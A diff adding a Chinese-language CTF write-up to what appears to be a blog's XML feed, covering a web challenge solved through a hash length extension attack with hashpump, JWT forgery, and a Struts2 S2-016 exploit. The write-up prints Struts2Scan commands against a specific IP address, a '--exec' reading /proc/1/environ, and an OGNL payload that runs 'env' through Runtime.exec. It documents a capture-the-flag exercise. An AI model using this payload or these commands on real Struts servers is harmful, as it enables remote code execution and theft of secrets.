@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>攻防世界*ctf wp</title>
+      <link href="/2023/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ctf-wp/"/>
+      <url>/2023/08/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-ctf-wp/</url>
+      
+        <content type="html"><![CDATA[<p>总结一下前两天*ctf里面的web题，这道题整体还是比较简单的，大概是用到了jwt伪造+hash长度扩展攻击</p><p>点进题目之后，可以在页面源码找到一个路由，访问之后可以得到</p><pre><code>&lt;?php  highlight_file(__FILE__);  include &quot;./secret_key.php&quot;;  include &quot;./salt.php&quot;;  //$salt = XXXXXXXXXXXXXX // the salt include 14 characters  //md5($salt.&quot;adminroot&quot;)=e6ccbf12de9d33ec27a5bcfb6a3293df  @$username = urldecode($_POST[&quot;username&quot;]);  @$password = urldecode($_POST[&quot;password&quot;]);  if (!empty($_COOKIE[&quot;digest&quot;])) &#123;      if ($username === &quot;admin&quot; &amp;&amp; $password != &quot;root&quot;) &#123;           if ($_COOKIE[&quot;digest&quot;] === md5($salt.$username.$password)) &#123;              die (&quot;The secret_key is &quot;. $secret_key);          &#125;          else &#123;              die (&quot;Your cookies don&#39;t match up! STOP HACKING THIS SITE.&quot;);          &#125;      &#125;      else &#123;          die (&quot;no no no&quot;);      &#125;  &#125;</code></pre><p>这里的salt是在username和password前面，所以这里猜测可以使用hash长度扩展攻击，用到了hashpump这个工具</p><p>我的是在kali里面装的</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182212590.png" alt="image-20230801182212590"></p><blockquote><p>第一个数据是salt和adminroot拼接之后MD5加密得到的值，第二数据是adminroot后半部分的root，是因为上面的判断要求username &#x3D;&#x3D;&#x3D; “admin”，接着是salt和admin的长度和，然后随便添加一个值习惯字符数大于4（没验证过小于四会不会影响复现），然后就会分别得到digest和password的值，注意这里得到的password的值要把\x替换为%</p></blockquote><p>然后就可以得到</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182634751.png" alt="image-20230801182634751"></p><p>之后就要用到<a href="https://jwt.io/">jwt伪造</a>,填入得到的key即可获得伪造好的cookit.</p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801182944043.png" alt="image-20230801182944043"></p><p>然后就会进入一个新的路由，查看页面再结合题目，不难猜测是structs,直接用<a href="https://gitcode.net/mirrors/Vancomycin-g/struts2scan">工具</a>,</p><pre><code>python3 Struts2Scan.py -u http://140.210.223.216:55557/admiiiiiiiiiiin/user.actionpython3 Struts2Scan.py -u http://140.210.223.216:55557/admiiiiiiiiiiin/user.action -n S2-016 --exec&gt;cat /proc/1/environ</code></pre><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801184135593.png" alt="image-20230801184135593"></p><p><img src="https://img-1317758194.cos.ap-nanjing.myqcloud.com/typoraimage-20230801184153332.png" alt="image-20230801184153332"></p><p>执行任意代码payload：(flag在环境变量里面)</p><pre><code>&#39; + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;env&#39;).getInputStream())) + &#39;</code></pre><p>输出出来的环境变量里面有flag。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> wp </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>phar反序列化</title>
       <link href="/2023/07/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
       <url>/2023/07/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
